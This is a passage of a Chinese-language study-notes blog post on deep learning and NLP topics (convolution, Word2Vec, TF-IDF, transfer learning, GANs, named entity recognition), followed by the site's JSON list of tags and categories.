PS：为什么经常将全连接层转化为全卷积？全卷积和FCN的参数一样多，之所以用全卷积，主要是为了在卷积层上实现滑动窗口，减少重复卷积的计算，在目标检测中很有用。还有一种说法是为了让卷积网络在一张更大的输入图片上滑动，得到每个区域的输出。https://blog.csdn.net/u010548772/article/details/78582250https://blog.csdn.net/nnnnnnnnnnnny/article/details/70194432 Dilated Convolution空洞卷积/扩张卷积/膨胀卷积http://blog.csdn.net/guvcolie/article/details/77884530?locationNum=10&amp;fps=1https://blog.csdn.net/mao_xiao_feng/article/details/77924003http://www.cnblogs.com/ranjiewen/p/7945249.html Word2vec之Skip-Gram模型Word2Vec其实就是通过学习文本来用词向量的方式表征词的语义信息，即通过一个嵌入空间使得语义上相似的单词在该空间内距离很近。Embedding其实就是一个映射，将单词从原先所属的空间映射到新的多维空间中，也就是把原先词所在空间嵌入到一个新的空间中去。 Word2Vec模型中，主要有Skip-Gram和CBOW两种模型，从直观上理解，Skip-Gram是给定input word来预测上下文。而CBOW是给定上下文，来预测input word。本篇文章仅讲解Skip-Gram模型。 结构篇：https://www.leiphone.com/news/201706/PamWKpfRFEI42McI.html 训练篇：https://www.leiphone.com/news/201706/eV8j3Nu8SMqGBnQB.html 实现篇：https://www.leiphone.com/news/201706/QprrvzsrZCl4S2lw.html PS：吴恩达序列模型课程自然语言处理章节有详细讲解。 文本数据抽取 词袋法：将文本当作一个无序的数据集合，文本特征可以采用文本中的词条T进行体现，那么文本中出现的所有词条及其出现的次数就可以体现文档的特征 TF-IDF: 词条的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降；也就是说词条在文本中出现的次数越多，表示该词条对该文本的重要性越高，词条在所有文本中出现的次数越少，说明这个词条对文本的重要性越高。TF(词频)指某个词条在文本中出现的次数，一般会将其进行归一化处理(该词条数量/该文档中所有词条数量)；IDF(逆向文件频率)指一个词条重要性的度量，一般计算方式为总文件数目除以包含该词语之文件的数目，再将得到的商取对数得到。TF-IDF实际上是：TF * IDF 迁移学习深度学习中，最强大的理念之一就是，有的时候神经网络可以从一个任务中习得知识，并将这些知识应用到另一个独立的任务中。所以例如，也许你已经训练好一个神经网络，能够识别像猫这样的对象，然后使用那些知识，或者部分习得的知识去帮助您更好地阅读x射线扫描图，这就是所谓的迁移学习。 通常做法就是，你可以把识别猫的神经网络最后的输出层及其对应的权重删掉，然后设计一个全新的输出层，并为其重新赋予随机权重，然后让它在放射诊断数据上训练。 那什么时候迁移学习是有意义的？如果你想从任务学习A并迁移一些知识到任务B，那么当任务A和任务B都有同样的输入X时，迁移学习是有意义的（比如识别猫和X射线扫描时输入的都是图像）。并且当任务A的数据比任务B多得多时，迁移学习意义更大。 更多细节详见 吴恩达的 “迁移学习” 章节讲解。 TensorFlow Hub 可以实现迁移学习，GitHub 代码示例地址：图像再训练 生成对抗网络GAN之所以是对抗的，是因为GAN的内部是竞争关系，一方叫generator，它的主要工作是生成图片，并且尽量使得其看上去是来自于训练样本的。另一方是discriminator，其目标是判断输入图片是否属于真实训练样本。 更直白的讲，将generator想象成假币制造商，而discriminator是警察。generator目的是尽可能把假币造的跟真的一样，从而能够骗过discriminator，即生成样本并使它看上去好像来自于真实训练样本一样。 命名实体识别命名实体识别(Named EntitiesRecognition, NER)是自然语言处理(Natural LanguageProcessing, NLP)的一个基础任务，常用在信息抽取、信息检索、机器翻译、问答系统中。 命名实体是命名实体识别的研究主体，一般包括3大类(实体类、时间类和数字类)和7小类(人名、地名、机构名、时间、日期、货币和百分比)命名实体。 评判一个命名实体是否被正确识别包括两个方面： 实体的边界是否正确 实体的类型是否标注正确主要错误类型包括文本正确，类型可能错误；反之，文本边界错误,标记的类型正确。 命名实体识别的主要技术方法分为： 基于规则和词典的方法 基于统计的方法 二者混合的方法等。 基于规则的方法多采用语言学专家手工构造规则模板,选用特征包括统计信息、标点符号、关键字、指示词和方向词、位置词(如尾字)、中心词等方法，以模式和字符串相匹配为主要手段，这类系统大多依赖于知识库和词典的建立。 基于统计机器学习的方法主要包括：隐马尔可夫模型(HiddenMarkovMode,HMM)、最大熵(MaxmiumEntropy,ME)、支持向量机(Support VectorMachine,SVM)、条件随机场( ConditionalRandom Fields,CRF)等。 命名实体识别方法汇总 神经网络结构在命名实体识别（NER）中的应用 统计自然语言处理梳理一：分词、命名实体识别、词性标注 电子病历命名实体识别项目：https://github.com/Wasim37/NERuselocal 电子病历实体识别项目文档：https://pan.baidu.com/s/1Ypy2F0EHnD5FmX6L_BqWRA 密码：3s24 jieba分词","link":"/2019/01/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Swagger","slug":"Swagger","link":"/tags/Swagger/"},{"name":"concurrent","slug":"concurrent","link":"/tags/concurrent/"},{"name":"Batch Normalization","slug":"Batch-Normalization","link":"/tags/Batch-Normalization/"},{"name":"CAP","slug":"CAP","link":"/tags/CAP/"},{"name":"BASE","slug":"BASE","link":"/tags/BASE/"},{"name":"ACID","slug":"ACID","link":"/tags/ACID/"},{"name":"Druid","slug":"Druid","link":"/tags/Druid/"},{"name":"Flume","slug":"Flume","link":"/tags/Flume/"},{"name":"HDFS","slug":"HDFS","link":"/tags/HDFS/"},{"name":"github","slug":"github","link":"/tags/github/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"集合","slug":"集合","link":"/tags/%E9%9B%86%E5%90%88/"},{"name":"疑难杂症","slug":"疑难杂症","link":"/tags/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"MapReduce","slug":"MapReduce","link":"/tags/MapReduce/"},{"name":"atlas","slug":"atlas","link":"/tags/atlas/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"备份","slug":"备份","link":"/tags/%E5%A4%87%E4%BB%BD/"},{"name":"恢复","slug":"恢复","link":"/tags/%E6%81%A2%E5%A4%8D/"},{"name":"zabbix","slug":"zabbix","link":"/tags/zabbix/"},{"name":"面向对象","slug":"面向对象","link":"/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"name":"aof","slug":"aof","link":"/tags/aof/"},{"name":"安全","slug":"安全","link":"/tags/%E5%AE%89%E5%85%A8/"},{"name":"大数据教程","slug":"大数据教程","link":"/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%95%99%E7%A8%8B/"},{"name":"Sqoop","slug":"Sqoop","link":"/tags/Sqoop/"},{"name":"VPSMate","slug":"VPSMate","link":"/tags/VPSMate/"},{"name":"jdk","slug":"jdk","link":"/tags/jdk/"},{"name":"word解析","slug":"word解析","link":"/tags/word%E8%A7%A3%E6%9E%90/"},{"name":"Open XML SDK 2.0 Productivity Tool","slug":"Open-XML-SDK-2-0-Productivity-Tool","link":"/tags/Open-XML-SDK-2-0-Productivity-Tool/"},{"name":"线程池","slug":"线程池","link":"/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"},{"name":"es","slug":"es","link":"/tags/es/"},{"name":"表扩展","slug":"表扩展","link":"/tags/%E8%A1%A8%E6%89%A9%E5%B1%95/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"爬虫","slug":"爬虫","link":"/tags/%E7%88%AC%E8%99%AB/"},{"name":"初始化块","slug":"初始化块","link":"/tags/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97/"},{"name":"人脸识别","slug":"人脸识别","link":"/tags/%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/"},{"name":"卷积","slug":"卷积","link":"/tags/%E5%8D%B7%E7%A7%AF/"},{"name":"边缘检测","slug":"边缘检测","link":"/tags/%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B/"},{"name":"机器学习","slug":"机器学习","link":"/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"吴恩达","slug":"吴恩达","link":"/tags/%E5%90%B4%E6%81%A9%E8%BE%BE/"},{"name":"深度学习","slug":"深度学习","link":"/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"shiro","slug":"shiro","link":"/tags/shiro/"},{"name":"大数据","slug":"大数据","link":"/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"微信公众号","slug":"微信公众号","link":"/tags/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"},{"name":"微服务教程","slug":"微服务教程","link":"/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%95%99%E7%A8%8B/"},{"name":"机器学习教程","slug":"机器学习教程","link":"/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/"},{"name":"主题模型","slug":"主题模型","link":"/tags/%E4%B8%BB%E9%A2%98%E6%A8%A1%E5%9E%8B/"},{"name":"贝叶斯","slug":"贝叶斯","link":"/tags/%E8%B4%9D%E5%8F%B6%E6%96%AF/"},{"name":"隐马尔科夫模型","slug":"隐马尔科夫模型","link":"/tags/%E9%9A%90%E9%A9%AC%E5%B0%94%E7%A7%91%E5%A4%AB%E6%A8%A1%E5%9E%8B/"},{"name":"EM","slug":"EM","link":"/tags/EM/"},{"name":"CNN","slug":"CNN","link":"/tags/CNN/"},{"name":"YOLO","slug":"YOLO","link":"/tags/YOLO/"},{"name":"SSD","slug":"SSD","link":"/tags/SSD/"},{"name":"StyleTransfer","slug":"StyleTransfer","link":"/tags/StyleTransfer/"},{"name":"脚本","slug":"脚本","link":"/tags/%E8%84%9A%E6%9C%AC/"},{"name":"运维","slug":"运维","link":"/tags/%E8%BF%90%E7%BB%B4/"},{"name":"经典网络","slug":"经典网络","link":"/tags/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C/"},{"name":"JVM","slug":"JVM","link":"/tags/JVM/"},{"name":"编码规范","slug":"编码规范","link":"/tags/%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83/"},{"name":"虚拟机","slug":"虚拟机","link":"/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"Metrics","slug":"Metrics","link":"/tags/Metrics/"},{"name":"tcp","slug":"tcp","link":"/tags/tcp/"},{"name":"hive","slug":"hive","link":"/tags/hive/"},{"name":"sonar","slug":"sonar","link":"/tags/sonar/"},{"name":"jenkins","slug":"jenkins","link":"/tags/jenkins/"},{"name":"分布式事务","slug":"分布式事务","link":"/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"name":"2pc","slug":"2pc","link":"/tags/2pc/"},{"name":"3pc","slug":"3pc","link":"/tags/3pc/"},{"name":"分布式算法","slug":"分布式算法","link":"/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E7%AE%97%E6%B3%95/"},{"name":"RNN","slug":"RNN","link":"/tags/RNN/"},{"name":"Attention Model","slug":"Attention-Model","link":"/tags/Attention-Model/"},{"name":"SVM","slug":"SVM","link":"/tags/SVM/"},{"name":"聚类","slug":"聚类","link":"/tags/%E8%81%9A%E7%B1%BB/"},{"name":"算法复杂度","slug":"算法复杂度","link":"/tags/%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6/"},{"name":"薛兆丰的北大经济学课","slug":"薛兆丰的北大经济学课","link":"/tags/%E8%96%9B%E5%85%86%E4%B8%B0%E7%9A%84%E5%8C%97%E5%A4%A7%E7%BB%8F%E6%B5%8E%E5%AD%A6%E8%AF%BE/"},{"name":"NLP","slug":"NLP","link":"/tags/NLP/"},{"name":"word2vec","slug":"word2vec","link":"/tags/word2vec/"},{"name":"elk","slug":"elk","link":"/tags/elk/"},{"name":"lambda","slug":"lambda","link":"/tags/lambda/"},{"name":"性能检测","slug":"性能检测","link":"/tags/%E6%80%A7%E8%83%BD%E6%A3%80%E6%B5%8B/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"hadoop","slug":"hadoop","link":"/tags/hadoop/"},{"name":"特征工程","slug":"特征工程","link":"/tags/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B/"},{"name":"决策树","slug":"决策树","link":"/tags/%E5%86%B3%E7%AD%96%E6%A0%91/"},{"name":"随机森林","slug":"随机森林","link":"/tags/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/"},{"name":"提升算法","slug":"提升算法","link":"/tags/%E6%8F%90%E5%8D%87%E7%AE%97%E6%B3%95/"},{"name":"完全备份","slug":"完全备份","link":"/tags/%E5%AE%8C%E5%85%A8%E5%A4%87%E4%BB%BD/"},{"name":"增量备份","slug":"增量备份","link":"/tags/%E5%A2%9E%E9%87%8F%E5%A4%87%E4%BB%BD/"},{"name":"Percona Xtrabackup","slug":"Percona-Xtrabackup","link":"/tags/Percona-Xtrabackup/"},{"name":"Lambda","slug":"Lambda","link":"/tags/Lambda/"},{"name":"nginx","slug":"nginx","link":"/tags/nginx/"},{"name":"线性回归","slug":"线性回归","link":"/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"name":"逻辑回归","slug":"逻辑回归","link":"/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"运维部署","slug":"运维部署","link":"/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"},{"name":"JAVA","slug":"JAVA","link":"/categories/JAVA/"},{"name":"深度学习","slug":"深度学习","link":"/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"算法及理论","slug":"算法及理论","link":"/categories/%E7%AE%97%E6%B3%95%E5%8F%8A%E7%90%86%E8%AE%BA/"},{"name":"大数据","slug":"大数据","link":"/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"其他","slug":"其他","link":"/categories/%E5%85%B6%E4%BB%96/"},{"name":"错误集锦","slug":"错误集锦","link":"/categories/%E9%94%99%E8%AF%AF%E9%9B%86%E9%94%A6/"},{"name":"知识总结","slug":"知识总结","link":"/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"},{"name":"数据库","slug":"数据库","link":"/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"资源共享","slug":"资源共享","link":"/categories/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/"},{"name":"机器学习","slug":"机器学习","link":"/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]}